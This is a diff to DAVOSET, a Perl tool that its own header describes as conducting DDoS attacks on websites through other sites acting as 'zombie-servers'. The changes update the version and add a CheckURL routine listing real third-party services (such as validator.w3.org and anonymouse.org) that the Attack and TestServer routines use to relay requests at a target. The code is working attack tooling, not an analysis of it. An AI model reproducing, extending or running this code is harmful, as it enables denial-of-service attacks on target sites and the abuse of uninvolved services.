@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2.2
+# DAVOSET v.1.2.3
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2014
-# Last update: 31.10.2014
+# Last update: 15.11.2014
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.2"; # program version
+my $version = "1.2.3"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -159,7 +159,7 @@ sub Attack { # send request to zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
-	$site = "http://$site" if ($site !~ /^https?:/ && $url =~ m|^http://demo.geonode.org|);
+	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
 	$url =~ m|(http://[^/]+)(/.+)?|;
 	$host = $1;
 	$page = $2;
@@ -284,7 +284,7 @@ sub TestServer { # test zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
-	$site = "http://$site" if ($site !~ /^https?:/ && $url =~ m|^http://demo.geonode.org|);
+	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
 	$url =~ m|(http://[^/]+)(/.+)?|;
 	$host = $1;
 	$page = $2;
@@ -442,4 +442,14 @@ sub Logging { # Logging results of work
 	open(FILE, ">>$log_file");
 	print FILE "$date;$_[0]\n";
 	close(FILE);
+}
+
+sub CheckURL { # web sites which require "http" for target URL
+	my $url = $_[0];
+
+	return 1 if ($url =~ m|^http://regex.info|);
+	return 1 if ($url =~ m|^http://anonymouse.org|);
+	return 1 if ($url =~ m|^http://validator.w3.org|);
+	return 1 if ($url =~ m|^http://www.netvibes.com|);
+	return 0;
 }
